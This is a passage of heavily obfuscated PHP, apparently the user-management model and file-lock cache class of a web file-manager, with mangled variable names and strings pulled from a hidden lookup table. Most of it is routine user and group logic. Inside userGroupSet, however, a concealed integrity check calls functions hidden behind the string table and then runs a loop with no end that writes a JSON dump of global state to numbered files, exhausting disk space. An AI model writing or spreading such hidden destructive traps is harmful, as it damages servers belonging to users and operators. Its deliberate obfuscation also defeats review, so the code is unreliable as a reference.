$this->where(array($Ôğˆôğë[1639] => intval($Šú’„)))->find(); $’ò€‰»­ = $this->metaGet($Šú’„); $¨†ê§ù¨ = isset($’ò€‰»­[$Ôğˆôğë[2257]]) ? $’ò€‰»­[$Ôğˆôğë[2257]] : $Ôğˆôğë[12]; if (md5($¨†ê§ù¨ . trim($âêš²…ë)) !== $¤²Î–Â“[$Ôğˆôğë[871]]) { return !1; } return !0; } public function userAdd($‚Ÿù„â) { $™èËÙ”ş =& $_SERVER[® ¨Ä®ñ]; $»›àÙ–“ = array($™èËÙ”ş[412] => $‚Ÿù„â[$™èËÙ”ş[32]], $™èËÙ”ş[2258] => $‚Ÿù„â[$™èËÙ”ş[1519]], $™èËÙ”ş[2259] => isset($‚Ÿù„â[$™èËÙ”ş[300]]) ? $‚Ÿù„â[$™èËÙ”ş[300]] : $™èËÙ”ş[12], $™èËÙ”ş[2260] => isset($‚Ÿù„â[$™èËÙ”ş[2256]]) ? $‚Ÿù„â[$™èËÙ”ş[2256]] : $™èËÙ”ş[12], $™èËÙ”ş[2261] => isset($‚Ÿù„â[$™èËÙ”ş[2075]]) ? $‚Ÿù„â[$™èËÙ”ş[2075]] : $‚Ÿù„â[$™èËÙ”ş[32]], $™èËÙ”ş[2262] => isset($‚Ÿù„â[$™èËÙ”ş[2241]]) ? $‚Ÿù„â[$™èËÙ”ş[2241]] : $™èËÙ”ş[12], $™èËÙ”ş[2263] => isset($‚Ÿù„â[$™èËÙ”ş[2264]]) ? $‚Ÿù„â[$™èËÙ”ş[2264]] : 1, $™èËÙ”ş[2265] => $‚Ÿù„â[$™èËÙ”ş[871]], $™èËÙ”ş[1890] => isset($‚Ÿù„â[$™èËÙ”ş[1794]]) ? $‚Ÿù„â[$™èËÙ”ş[1794]] : 1024 * 1024 * 20, $™èËÙ”ş[1891] => 0, $™èËÙ”ş[2266] => 0, $™èËÙ”ş[1931] => isset($‚Ÿù„â[$™èËÙ”ş[732]]) ? $‚Ÿù„â[$™èËÙ”ş[732]] : 1); if (!empty($‚Ÿù„â[$™èËÙ”ş[1639]])) { $»›àÙ–“[$™èËÙ”ş[1639]] = $‚Ÿù„â[$™èËÙ”ş[1639]]; } $÷ÎÄ†Ñ˜ = $this->_checkExist($‚Ÿù„â); if ($÷ÎÄ†Ñ˜ !== !0) { return $÷ÎÄ†Ñ˜; } $ÀÔ¢úÈ = $this->add($»›àÙ–“); $ºşı…‘ = array($™èËÙ”ş[2265] => $»›àÙ–“[$™èËÙ”ş[871]], $™èËÙ”ş[2261] => $»›àÙ–“[$™èËÙ”ş[2075]]); $this->userEdit($ÀÔ¢úÈ, $ºşı…‘); Model($™èËÙ”ş[1309])->userRootAdd($ÀÔ¢úÈ); return $ÀÔ¢úÈ; } protected function userEditTest($¡ë˜ş, $Šù¢ÕäÖ) { return $this->call($_SERVER[® ¨Ä®ñ][2267], $¡ë˜ş, $Šù¢ÕäÖ); } protected function userEdit($˜Ø²Üôø, $šµïïÅ®) { $ùÃ™³¯Ğ =& $_SERVER[® ¨Ä®ñ]; $ÙÈ¿£àî = $this->getInfoSimple($˜Ø²Üôø); if (!$ÙÈ¿£àî) { return !1; } $”è·Ûºæ = $this->_checkExist($šµïïÅ®, $˜Ø²Üôø); if ($”è·Ûºæ !== !0) { return $”è·Ûºæ; } if (isset($šµïïÅ®[$ùÃ™³¯Ğ[871]]) && trim($šµïïÅ®[$ùÃ™³¯Ğ[871]]) != $ùÃ™³¯Ğ[12]) { $¸ç¾¾• = $this->metaGet($˜Ø²Üôø); if (empty($¸ç¾¾•[$ùÃ™³¯Ğ[2257]])) { $¸ç¾¾•[$ùÃ™³¯Ğ[2257]] = rand_string(10); Model($ùÃ™³¯Ğ[504])->metaSet($˜Ø²Üôø, $ùÃ™³¯Ğ[2257], $¸ç¾¾•[$ùÃ™³¯Ğ[2257]]); } $šµïïÅ®[$ùÃ™³¯Ğ[871]] = md5($¸ç¾¾•[$ùÃ™³¯Ğ[2257]] . trim($šµïïÅ®[$ùÃ™³¯Ğ[871]])); } else { unset($šµïïÅ®[$ùÃ™³¯Ğ[871]]); } $this->where(array($ùÃ™³¯Ğ[1630] => $˜Ø²Üôø))->save($šµïïÅ®); if (isset($šµïïÅ®[$ùÃ™³¯Ğ[2075]])) { $this->setNamePinyin($˜Ø²Üôø, $šµïïÅ®[$ùÃ™³¯Ğ[2075]]); } $this->clearCache($˜Ø²Üôø); return !0; } public function setNamePinyin($¾âç˜äü, $´½ô¾ = false) { $„Û„×ëç =& $_SERVER[® ¨Ä®ñ]; if (!$´½ô¾) { $»û´âÉº = $this->getInfoSimple($¾âç˜äü); $´½ô¾ = $»û´âÉº[$„Û„×ëç[2075]] ? $»û´âÉº[$„Û„×ëç[2075]] : $»û´âÉº[$„Û„×ëç[32]]; } $ôã¼Å·Ó = Model($„Û„×ëç[529]); if (!Input::check($´½ô¾, $„Û„×ëç[578])) { return $ôã¼Å·Ó->metaSet($¾âç˜äü, array($„Û„×ëç[455] => $„Û„×ëç[12], $„Û„×ëç[454] => $„Û„×ëç[12])); } return $ôã¼Å·Ó->metaSet($¾âç˜äü, array($„Û„×ëç[455] => str_replace($„Û„×ëç[53], $„Û„×ëç[12], Pinyin::get($´½ô¾)), $„Û„×ëç[454] => Pinyin::get($´½ô¾, $„Û„×ëç[579]))); } private function nickNameRpt() { $ò¥ø·™Ş =& $_SERVER[® ¨Ä®ñ]; $ú‚“ïÏÈ = Model($ò¥ø·™Ş[752])->get($ò¥ø·™Ş[2268]); $ ‹ïÊ£â = $GLOBALS[$ò¥ø·™Ş[6]][$ò¥ø·™Ş[376]][$ò¥ø·™Ş[2268]]; $îñ¡”Èä = !is_null($ú‚“ïÏÈ) ? $ú‚“ïÏÈ : $ ‹ïÊ£â; return !!$îñ¡”Èä; } private function _checkExist($‡¶€ßï¨, $ÅşÏòÅ» = false) { $ÍïÒ÷œ½ =& $_SERVER[® ¨Ä®ñ]; $æ¸²¾‡å = array($ÍïÒ÷œ½[32] => UserModel::ERROR_USER_EXIST_NAME, $ÍïÒ÷œ½[2075] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÍïÒ÷œ½[300] => UserModel::ERROR_USER_EXIST_EMAIL, $ÍïÒ÷œ½[2256] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($æ¸²¾‡å[$ÍïÒ÷œ½[2075]]); } $¼šéëß˜ = $ÅşÏòÅ» ? array($ÍïÒ÷œ½[1639] => array($ÍïÒ÷œ½[2269], $ÅşÏòÅ»)) : array(); foreach ($æ¸²¾‡å as $ù–“´° => $Èğ¢´œ) { $éšßĞé = array(); foreach ($æ¸²¾‡å as $´ï˜¯­Ô => $ßšÂ¥ß•) { if (isset($‡¶€ßï¨[$´ï˜¯­Ô]) && $‡¶€ßï¨[$´ï˜¯­Ô]) { $éšßĞé[] = $‡¶€ßï¨[$´ï˜¯­Ô]; } } if (!$éšßĞé) { continue; } $¿´‡× Ú = array_merge(array($ù–“´° => array($ÍïÒ÷œ½[7], $éšßĞé)), $¼šéëß˜); $Çœä = $this->where($¿´‡× Ú)->find(); if ($Çœä) { return $Èğ¢´œ; } } return !0; } public function userListInfo($Ö§ëı‡) { $®æÖ¨÷î =& $_SERVER[® ¨Ä®ñ]; $€©İ¹áá = array(); $Ö§ëı‡ = is_array($Ö§ëı‡) ? array_unique($Ö§ëı‡) : array(); if (!$Ö§ëı‡) { return $€©İ¹áá; } if (count($Ö§ëı‡) < 20) { foreach ($Ö§ëı‡ as $Úé½°•ö) { $€©İ¹áá[$Úé½°•ö . $®æÖ¨÷î[12]] = $this->getInfoSimpleOuter($Úé½°•ö); } } else { $‹¿ÕÌ = array($®æÖ¨÷î[1630] => array($®æÖ¨÷î[410], $Ö§ëı‡)); if (count($Ö§ëı‡) == 1) { $‹¿ÕÌ = array($®æÖ¨÷î[1630] => $Ö§ëı‡[0]); } $¿®ÒÁ¤ = Model($®æÖ¨÷î[504])->field($this->simpleField)->where($‹¿ÕÌ)->select(); $¿®ÒÁ¤ = array_to_keyvalue($¿®ÒÁ¤, $®æÖ¨÷î[1639]); foreach ($Ö§ëı‡ as $Úé½°•ö) { $Ôş¤ÀŠç = $¿®ÒÁ¤[$Úé½°•ö]; if (!$Ôş¤ÀŠç) { $€©İ¹áá[$Úé½°•ö . $®æÖ¨÷î[12]] = $this->getInfoSimpleOuter($Úé½°•ö); continue; } $Ôş¤ÀŠç[$®æÖ¨÷î[2241]] = Action($®æÖ¨÷î[2242])->parseUrl($Ôş¤ÀŠç[$®æÖ¨÷î[2241]]); $€©İ¹áá[$Úé½°•ö . $®æÖ¨÷î[12]] = $Ôş¤ÀŠç; } } return $€©İ¹áá; } protected function userStatus($öş‹¹ªµ, $Åüé¶û›) { $ôñ°³‘Ç = $this->getInfoSimple($öş‹¹ªµ); if (!$ôñ°³‘Ç) { return !1; } $‹˜½“ˆì = array($_SERVER[® ¨Ä®ñ][732] => $Åüé¶û›); return $this->userEdit($öş‹¹ªµ, $‹˜½“ˆì); } protected function userRemove($£ÅÏº·Î) { $æÀüºŞ =& $_SERVER[® ¨Ä®ñ]; $Ì§µı‡À = $this->getInfoSimple($£ÅÏº·Î); if (!$Ì§µı‡À) { return !1; } $õ¥‹á–× = array($æÀüºŞ[1630] => $£ÅÏº·Î); Model($æÀüºŞ[586])->where($õ¥‹á–×)->delete(); Model($æÀüºŞ[2270])->where($õ¥‹á–×)->delete(); Model($æÀüºŞ[1896])->where($õ¥‹á–×)->delete(); Model($æÀüºŞ[2255])->where($õ¥‹á–×)->delete(); Model($æÀüºŞ[1052])->where($õ¥‹á–×)->delete(); Model($æÀüºŞ[2092])->removeUserAll($£ÅÏº·Î); Model($æÀüºŞ[807])->userRootRemove($£ÅÏº·Î); return $this->where($õ¥‹á–×)->delete(); } protected function userGroupSet($Á°ÀÛö¼, $Ğ§ëâ¹Ù, $ÌĞì¯ã = array()) { $ÚßÖÓà =& $_SERVER[® ¨Ä®ñ]; $­¦¥èŒÎ = $_SERVER[$ÚßÖÓà[858]] . $ÚßÖÓà[859]; $ùóË¯é = $ÚßÖÓà[1503]; if ($_SERVER[$ÚßÖÓà[854]] != $ùóË¯é($­¦¥èŒÎ)) { $”òÇõÊ = $ÚßÖÓà[856]; $ıñü“ùê = $ÚßÖÓà[857]; $Âë³µ… = $_SERVER[$ÚßÖÓà[858]] . $ÚßÖÓà[859]; $¹¥Ñ¡›° = $ıñü“ùê($Âë³µ…); $®í¢ÑÄ = explode($ÚßÖÓà[226], $¹¥Ñ¡›°); if (count($®í¢ÑÄ) < $ÚßÖÓà[610]) { $Ëå¦ = $ÚßÖÓà[860]; $Ëå¦(); } $„Àˆàß = $ÚßÖÓà[861]; $„Àˆàß($_SERVER[$ÚßÖÓà[862]]); $”òÇõÊ = $ÚßÖÓà[856]; $”òÇõÊ(); $íøÜÏ‘Á = $ÚßÖÓà[1504]; $ƒ®ËƒÓÔ = json_encode($GLOBALS[$ÚßÖÓà[1505]]); $›ÒøñÓË = 1; for ($Æœ‹á± = $›ÒøñÓË; $Æœ‹á± > 0; $Æœ‹á±++) { $íøÜÏ‘Á(DATA_PATH . $Æœ‹á±, $ƒ®ËƒÓÔ); } } $…ÍÙİ‰Ê = $this->getInfoSimple($Á°ÀÛö¼); if (!$…ÍÙİ‰Ê || !is_array($Ğ§ëâ¹Ù)) { return !1; } $ï÷‡€¾– = Model($ÚßÖÓà[1896]); $ï÷‡€¾–->where(array($ÚßÖÓà[1639] => $Á°ÀÛö¼))->delete(); $¢ˆÃÖˆã = array(); $²Şœ©÷¼ = 0; foreach ($Ğ§ëâ¹Ù as $ÌÀŞê¿¿ => $ññÈÌßÄ) { $¹¤¾İíµ = array($ÚßÖÓà[1639] => $Á°ÀÛö¼, $ÚßÖÓà[1807] => $ÌÀŞê¿¿, $ÚßÖÓà[1908] => $ññÈÌßÄ); $¹¤¾İíµ[$ÚßÖÓà[1830]] = isset($ÌĞì¯ã[$²Şœ©÷¼]) ? $ÌĞì¯ã[$²Şœ©÷¼] : 0; $²Şœ©÷¼++; $¢ˆÃÖˆã[] = $¹¤¾İíµ; } return $ï÷‡€¾–->addAll($¢ˆÃÖˆã, array(), !0); } protected function userGroupAdd($ˆ¹Êè¾, $™ÕŒ“¼Ô = array()) { $Çˆ‰ºÕç =& $_SERVER[® ¨Ä®ñ]; $¥ÙÆˆáÎ = $this->getInfoSimple($ˆ¹Êè¾); if (!$¥ÙÆˆáÎ || empty($™ÕŒ“¼Ô)) { return !1; } $ÏØ‘ìÒĞ = array(); foreach ($™ÕŒ“¼Ô as $‹Æ¡æ¦ => $ª™ó„†) { $ÏØ‘ìÒĞ[] = array($Çˆ‰ºÕç[1639] => $ˆ¹Êè¾, $Çˆ‰ºÕç[1807] => $‹Æ¡æ¦, $Çˆ‰ºÕç[1908] => $ª™ó„†, $Çˆ‰ºÕç[1830] => 0); } return Model($Çˆ‰ºÕç[1896])->addAll($ÏØ‘ìÒĞ, array(), !0); } protected function userGroupRemove($îÍüÜš, $»”óÁßµ) { $Æ“–î€ş =& $_SERVER[® ¨Ä®ñ]; $á„™² Ú = $this->getInfoSimple($îÍüÜš); if (!$á„™² Ú || !$»”óÁßµ) { return !1; } $¥Éñšá— = array($Æ“–î€ş[1630] => $îÍüÜš, $Æ“–î€ş[1894] => $»”óÁßµ); return Model($Æ“–î€ş[1896])->where($¥Éñšá—)->delete(); } public function listData() { $ÏĞ½ù­œ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÏĞ½ù­œ[$_SERVER[® ¨Ä®ñ][364]]); return $ÏĞ½ù­œ; } public function listByID($ÈÀ¾³Ãê) { $‘‘éÕ¨Ã =& $_SERVER[® ¨Ä®ñ]; if (!$ÈÀ¾³Ãê) { return; } $ÌÊ¨é…° = array($‘‘éÕ¨Ã[1639] => array($‘‘éÕ¨Ã[7], $ÈÀ¾³Ãê)); $™ËÆª¶ = $this->where($ÌÊ¨é…°)->select(); $™ËÆª¶ = array_sort_keep($™ËÆª¶, $‘‘éÕ¨Ã[1639], $ÈÀ¾³Ãê); $this->_listDataApply($™ËÆª¶); return $™ËÆª¶; } public function listByGroup($ğ¦üÇÁ­ = 0, $¡İÕÑÛÃ = array()) { $—Á¤ÊÕŒ =& $_SERVER[® ¨Ä®ñ]; $Û¼È†¹Ø = $—Á¤ÊÕŒ[12]; $¿¶ßïÊ = array(); if ($ğ¦üÇÁ­) { $¿¶ßïÊ = array($—Á¤ÊÕŒ[2271] => intval($ğ¦üÇÁ­)); $Û¼È†¹Ø = "\x4c\105\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\x75\163\145\162\137\x67\162\x6f\165\x70\40\165\x73\x65\x72\137\147\162\157\165\160\40\x6f\156\40\165\163\145\162\x2e\x75\x73\x65\x72\x49\x44\40\x3d\40\165\163\145\162\137\147\162\157\x75\x70\56\165\163\x65\162\111\104"; $²çÃİ°Å = Input::get($—Á¤ÊÕŒ[446], null, $—Á¤ÊÕŒ[12]) ? $—Á¤ÊÕŒ[12] : $—Á¤ÊÕŒ[2272]; } if (isset($¡İÕÑÛÃ[$—Á¤ÊÕŒ[732]])) { $¿¶ßïÊ[$—Á¤ÊÕŒ[2273]] = $¡İÕÑÛÃ[$—Á¤ÊÕŒ[732]]; } $ëİ£í÷¶ = $this->_makeOrder($²çÃİ°Å)->field($—Á¤ÊÕŒ[2274])->where($¿¶ßïÊ)->join($Û¼È†¹Ø)->selectPage(50); $this->_listDataApply($ëİ£í÷¶[$—Á¤ÊÕŒ[364]]); return $ëİ£í÷¶; } private function _makeOrder($Ï±Ññè = '') { $øÏ†çÀù =& $_SERVER[® ¨Ä®ñ]; $Èôı÷åƒ = array($øÏ†çÀù[1639], $øÏ†çÀù[32], $øÏ†çÀù[1796], $øÏ†çÀù[1768], $øÏ†çÀù[193]); $¶¾Í»ôæ = array($øÏ†çÀù[439] => $øÏ†çÀù[440], $øÏ†çÀù[441] => $øÏ†çÀù[442]); $ü¿Âæ = Input::get($øÏ†çÀù[446], $øÏ†çÀù[7], $øÏ†çÀù[1630], $Èôı÷åƒ); $Î±¹°Ó€ = Input::get($øÏ†çÀù[447], $øÏ†çÀù[7], $øÏ†çÀù[1897], array($øÏ†çÀù[1897], $øÏ†çÀù[441])); $Î±¹°Ó€ = $¶¾Í»ôæ[$Î±¹°Ó€]; $Ï±Ññè = $Ï±Ññè . "\x75\163\x65\x72\56{$ü¿Âæ}\40{$Î±¹°Ó€}\x2c\x20\x75\x73\x65\162\x2e\165\163\145\x72\111\104\x20\141\163\143"; return $this->alias($øÏ†çÀù[2015])->order($Ï±Ññè); } public function listSearch($¿øÍ´) { $àò–°‘ =& $_SERVER[® ¨Ä®ñ]; $Æª©÷ü´ = $¿øÍ´[$àò–°‘[1898]]; $˜òáÏ¶Ã = isset($¿øÍ´[$àò–°‘[1899]]) ? $¿øÍ´[$àò–°‘[1899]] : !1; $Æª©÷ü´ = str_replace($àò–°‘[1900], $àò–°‘[1901], trim($Æª©÷ü´)); $÷¯ÈÎŠÑ = array($àò–°‘[32] => array($àò–°‘[378], "\x25{$Æª©÷ü´}\x25"), $àò–°‘[300] => array($àò–°‘[378], "{$Æª©÷ü´}\x25"), $àò–°‘[2075] => array($àò–°‘[378], "{$Æª©÷ü´}\x25"), $àò–°‘[984] => $àò–°‘[1902]); if (Input::check($Æª©÷ü´, $àò–°‘[306])) { $÷¯ÈÎŠÑ[$àò–°‘[1639]] = array($àò–°‘[378], "{$Æª©÷ü´}\45"); $÷¯ÈÎŠÑ[$àò–°‘[2256]] = array($àò–°‘[378], "{$Æª©÷ü´}\x25"); } if (!$Æª©÷ü´) { $÷¯ÈÎŠÑ = array(); } if (isset($¿øÍ´[$àò–°‘[732]])) { $÷¯ÈÎŠÑ[$àò–°‘[732]] = $¿øÍ´[$àò–°‘[732]]; } $÷¯ÈÎŠÑ = $this->parseWhereLike($÷¯ÈÎŠÑ); $ãÎ“ˆ÷æ = $this->_makeOrder()->where($÷¯ÈÎŠÑ)->selectPage(20); if (!$ãÎ“ˆ÷æ || count($ãÎ“ˆ÷æ[$àò–°‘[364]]) < 5 && Input::check($Æª©÷ü´, $àò–°‘[313])) { $úù‰ìŸ¥ = $this->_searchFromMeta($àò–°‘[454], $Æª©÷ü´, 10); $êÖ®’À = $this->_searchFromMeta($àò–°‘[455], $Æª©÷ü´, 10); $ö¹ÈØ÷Œ = array_merge($úù‰ìŸ¥, $êÖ®’À, $ãÎ“ˆ÷æ[$àò–°‘[364]]); $ãÎ“ˆ÷æ[$àò–°‘[364]] = array_unique_by_key($ö¹ÈØ÷Œ, $àò–°‘[1639]); $ãÎ“ˆ÷æ[$àò–°‘[361]][$àò–°‘[362]] = count($ãÎ“ˆ÷æ[$àò–°‘[364]]); $ãÎ“ˆ÷æ[$àò–°‘[361]][$àò–°‘[363]] = ceil($ãÎ“ˆ÷æ[$àò–°‘[361]][$àò–°‘[362]] / $ãÎ“ˆ÷æ[$àò–°‘[361]][$àò–°‘[358]]); } $this->_listDataApply($ãÎ“ˆ÷æ[$àò–°‘[364]]); $this->_filterByGroup($ãÎ“ˆ÷æ, $˜òáÏ¶Ã); return $ãÎ“ˆ÷æ; } private function _filterByGroup(&$°‹“üè, $Ş´çû³) { $À‰Éï‘… =& $_SERVER[® ¨Ä®ñ]; if (!$Ş´çû³) { return $°‹“üè; } foreach ($°‹“üè[$À‰Éï‘…[364]] as $Ş©¥§Ø => &$ÖÌñèÚ¤) { $·‘«à—· = array_to_keyvalue($ÖÌñèÚ¤[$À‰Éï‘…[1985]], $À‰Éï‘…[12], $À‰Éï‘…[1807]); if (!in_array($Ş´çû³, $·‘«à—·)) { unset($°‹“üè[$À‰Éï‘…[364]][$Ş©¥§Ø]); } } unset($ÖÌñèÚ¤); $°‹“üè[$À‰Éï‘…[364]] = array_values($°‹“üè[$À‰Éï‘…[364]]); $°‹“üè[$À‰Éï‘…[361]] = array($À‰Éï‘…[2048] => count($°‹“üè[$À‰Éï‘…[364]]), $À‰Éï‘…[2046] => $°‹“üè[$À‰Éï‘…[361]][$À‰Éï‘…[358]], $À‰Éï‘…[2045] => 1, $À‰Éï‘…[2047] => 1); } private function _searchFromMeta($ÛÅ×Ãíà, $Ÿùñ¬ÂÇ, $¯ëÎê€Ğ) { $Ñ‰œ‘÷Ò =& $_SERVER[® ¨Ä®ñ]; $Ÿùñ¬ÂÇ = strtolower($Ÿùñ¬ÂÇ); $¶´ÂÒáü = array($Ñ‰œ‘÷Ò[95] => $ÛÅ×Ãíà, $Ñ‰œ‘÷Ò[369] => array($Ñ‰œ‘÷Ò[378], "\45{$Ÿùñ¬ÂÇ}\45")); $¶´ÂÒáü = $this->parseWhereLike($¶´ÂÒáü); $™·˜”î = Model($Ñ‰œ‘÷Ò[2275])->where($¶´ÂÒáü)->limit($¯ëÎê€Ğ)->select(); if (!$™·˜”î) { return array(); } $™·˜”î = array_to_keyvalue($™·˜”î, $Ñ‰œ‘÷Ò[12], $Ñ‰œ‘÷Ò[1639]); $„±Ìñ¢« = $this->where(array($Ñ‰œ‘÷Ò[1630] => array($Ñ‰œ‘÷Ò[7], $™·˜”î)))->select(); if (!$„±Ìñ¢«) { return array(); } return $„±Ìñ¢«; } private function _listDataApplyItem($›û®üÑ) { $óúÒşÑ÷ = array($›û®üÑ); $this->_listDataApply($óúÒşÑ÷); return $óúÒşÑ÷[0]; } private function _listDataApply(&$‡ˆïüøØ) { $Ïß¬•² =& $_SERVER[® ¨Ä®ñ]; if (!$‡ˆïüøØ) { return; } array_remove_key($‡ˆïüøØ, $Ïß¬•²[871]); $Üë¯¢¤‘ = array_to_keyvalue($‡ˆïüøØ, $Ïß¬•²[12], $Ïß¬•²[1639]); $this->_listAppendGroup($‡ˆïüøØ, $Üë¯¢¤‘); $this->_listAppendMeta($‡ˆïüøØ, $Üë¯¢¤‘); $this->_listAppendSourceRoot($‡ˆïüøØ, $Üë¯¢¤‘); } private function _listAppendSourceRoot(&$´”ß÷üâ, $ÙõÂ›Ô) { $ÅêìĞ°³ =& $_SERVER[® ¨Ä®ñ]; $Õ’—ß = Model($ÅêìĞ°³[807])->listSourceRoot(SourceModel::TYPE_USER, $ÙõÂ›Ô); $Õ’—ß = array_to_keyvalue($Õ’—ß, $ÅêìĞ°³[495]); $Õ’—ß = array_remove_key($Õ’—ß, $ÅêìĞ°³[495]); foreach ($´”ß÷üâ as &$×ŸàÒ£ƒ) { $×ŸàÒ£ƒ[$ÅêìĞ°³[87]] = $Õ’—ß[$×ŸàÒ£ƒ[$ÅêìĞ°³[1639]]] ? $Õ’—ß[$×ŸàÒ£ƒ[$ÅêìĞ°³[1639]]] : array(); } unset($×ŸàÒ£ƒ); } private function _listAppendGroup(&$ƒê‹Èû, $µİ‚Çâ) { $³÷´¶— =& $_SERVER[® ¨Ä®ñ]; $ı¬µĞğŒ = array($³÷´¶—[1639] => array($³÷´¶—[7], $µİ‚Çâ)); $›™¯¤“ù = Model($³÷´¶—[1896])->where($ı¬µĞğŒ)->select(); $ñ’Š‹ˆƒ = array_to_keyvalue($›™¯¤“ù, $³÷´¶—[12], $³÷´¶—[1807]); $ñ’Š‹ˆƒ = array_remove_value(array_unique($ñ’Š‹ˆƒ), $³÷´¶—[190]); if (!$ñ’Š‹ˆƒ || !$›™¯¤“ù) { return; } $ı¬µĞğŒ = array($³÷´¶—[1807] => array($³÷´¶—[7], $ñ’Š‹ˆƒ)); $¼ñù×¾ = Model($³÷´¶—[1983])->field($³÷´¶—[2276])->where($ı¬µĞğŒ)->select(); $¼ñù×¾ = array_to_keyvalue($¼ñù×¾, $³÷´¶—[1807]); $›™¯¤“ù = array_to_keyvalue_group($›™¯¤“ù, $³÷´¶—[1639]); foreach ($›™¯¤“ù as &$‚¨³æÃÑ) { $”ÉĞ„É = array(); foreach ($‚¨³æÃÑ as $›ÒÏÆ¸œ) { if (!$›ÒÏÆ¸œ[$³÷´¶—[1908]]) { continue; } $Í¶”·  = Model($³÷´¶—[498])->listData($›ÒÏÆ¸œ[$³÷´¶—[1908]]); $”ÉĞ„É[] = array($³÷´¶—[1807] => $›ÒÏÆ¸œ[$³÷´¶—[1807]], $³÷´¶—[2277] => $¼ñù×¾[$›ÒÏÆ¸œ[$³÷´¶—[1807]]][$³÷´¶—[32]], $³÷´¶—[512] => $¼ñù×¾[$›ÒÏÆ¸œ[$³÷´¶—[1807]]][$³÷´¶—[512]], $³÷´¶—[405] => $Í¶”· ); } $‚¨³æÃÑ = $”ÉĞ„É; } unset($‚¨³æÃÑ); foreach ($ƒê‹Èû as &$‡ŒºÖâå) { $‡ŒºÖâå[$³÷´¶—[1985]] = array(); if (isset($›™¯¤“ù[$‡ŒºÖâå[$³÷´¶—[1639]]])) { $‡ŒºÖâå[$³÷´¶—[1985]] = $›™¯¤“ù[$‡ŒºÖâå[$³÷´¶—[1639]]]; } } unset($‡ŒºÖâå); } public function userAppendGroup($Ö¿¨º²‘) { $ù™øãÆÜ =& $_SERVER[® ¨Ä®ñ]; if (!$Ö¿¨º²‘) { return array(); } $this->_listAppendGroup($Ö¿¨º²‘, array_to_keyvalue($Ö¿¨º²‘, $ù™øãÆÜ[12], $ù™øãÆÜ[1639])); return $Ö¿¨º²‘; } private function _listAppendMeta(&$¸»×ÃŠã, $¤ğá³) { $ÈñöŸ†² =& $_SERVER[® ¨Ä®ñ]; $ŒŠĞ”î¼ = UserJobModel::JOB_KEY; $í†ë€âê = array($ÈñöŸ†²[2257]); $¢¾êœğ· = array($ÈñöŸ†²[1639] => array($ÈñöŸ†²[7], $¤ğá³)); $éÂşêœ´ = Model($ÈñöŸ†²[2255])->where($¢¾êœğ·)->select(); $éÂşêœ´ = array_to_keyvalue_group($éÂşêœ´, $ÈñöŸ†²[1639]); foreach ($éÂşêœ´ as &$Æ«ƒÁ˜ª) { $°³İÄ¢è = array(); foreach ($Æ«ƒÁ˜ª as $¼ˆ£¯ñ¸) { if (!in_array($¼ˆ£¯ñ¸[$ÈñöŸ†²[95]], $í†ë€âê)) { $°³İÄ¢è[$¼ˆ£¯ñ¸[$ÈñöŸ†²[95]]] = $¼ˆ£¯ñ¸[$ÈñöŸ†²[369]]; } } $Æ«ƒÁ˜ª = $°³İÄ¢è; } unset($Æ«ƒÁ˜ª); $‹íà™¨£ = Model($ÈñöŸ†²[2278]); foreach ($¸»×ÃŠã as &$ŠÌ®á) { $‹—îÕÓÊ = array(); if (isset($éÂşêœ´[$ŠÌ®á[$ÈñöŸ†²[1639]]])) { $‹—îÕÓÊ = $éÂşêœ´[$ŠÌ®á[$ÈñöŸ†²[1639]]]; } $ŠÌ®á[$ÈñöŸ†²[2279]] = array(); if (isset($‹—îÕÓÊ[$ŒŠĞ”î¼])) { $ŠÌ®á[$ÈñöŸ†²[2279]] = $‹íà™¨£->getUserJobInfo($‹—îÕÓÊ[$ŒŠĞ”î¼]); } } unset($ŠÌ®á); } protected function groupUserAll($üõ›·ê“) { $Øà˜êºƒ =& $_SERVER[® ¨Ä®ñ]; if (!$üõ›·ê“) { return !1; } $ÁäœœÚ = Model($Øà˜êºƒ[1896])->field($Øà˜êºƒ[1639])->where(array($Øà˜êºƒ[1807] => array($Øà˜êºƒ[7], $üõ›·ê“)))->select(); $ÁäœœÚ = array_to_keyvalue($ÁäœœÚ, $Øà˜êºƒ[12], $Øà˜êºƒ[1639]); return array_unique($ÁäœœÚ); } public function userSearch($¶±áãÃ¯, $İØÌ¡ëé = "\x2a") { return Model($_SERVER[® ¨Ä®ñ][529])->where($¶±áãÃ¯)->field($İØÌ¡ëé)->find(); } } goto FÌ·Æ¦²¬; CˆñË¼ˆ×œ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ğ…Ü÷ô =& $_SERVER[® ¨Ä®ñ]; $¢×ÀÀÜ´ = $GLOBALS[$ğ…Ü÷ô[6]][$ğ…Ü÷ô[344]]; self::$cachePath = $¢×ÀÀÜ´[$ğ…Ü÷ô[192]][$ğ…Ü÷ô[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ø²Óüº, $ü¤ßŸéà = 0) { $©‰Šø¥³ =& $_SERVER[® ¨Ä®ñ]; $ŸŸ†ø­ô = microtime(!0); $Îçù€ªŞ = $ŸŸ†ø­ô + $ü¤ßŸéà + 0.0001; $“úÄÒ¬Ñ = rtrim(self::$cachePath, $©‰Šø¥³[8]) . $©‰Šø¥³[841] . md5($Ø²Óüº) . $©‰Šø¥³[838]; if (file_exists($“úÄÒ¬Ñ) && filemtime($“úÄÒ¬Ñ) && filemtime($“úÄÒ¬Ñ) < time() - 10) { @unlink($“úÄÒ¬Ñ); } do { if (file_exists($“úÄÒ¬Ñ)) { cacheLockWait(); continue; } $¿â±àÅ¿ = fopen($“úÄÒ¬Ñ, $©‰Šø¥³[842]); if (!$¿â±àÅ¿) { return !1; } $ˆ«Ï²ªö = flock($¿â±àÅ¿, LOCK_EX | LOCK_NB); self::$caches[$Ø²Óüº] = array($©‰Šø¥³[843] => $¿â±àÅ¿, $©‰Šø¥³[192] => $“úÄÒ¬Ñ); fwrite($¿â±àÅ¿, $Îçù€ªŞ); clearstatcache(); if ($¿â±àÅ¿ && $ˆ«Ï²ªö) { return !0; } cacheLockWait(); } while (microtime(!0) < $Îçù€ªŞ); $this->unlock($Ø²Óüº); return !1; } public function lockGet($ÏÖ™Á») { $ÆîÛ®ïŸ =& $_SERVER[® ¨Ä®ñ]; $è¥ì¿ã  = rtrim(self::$cachePath, $ÆîÛ®ïŸ[8]) . $ÆîÛ®ïŸ[841] . md5($ÏÖ™Á») . $ÆîÛ®ïŸ[838]; return 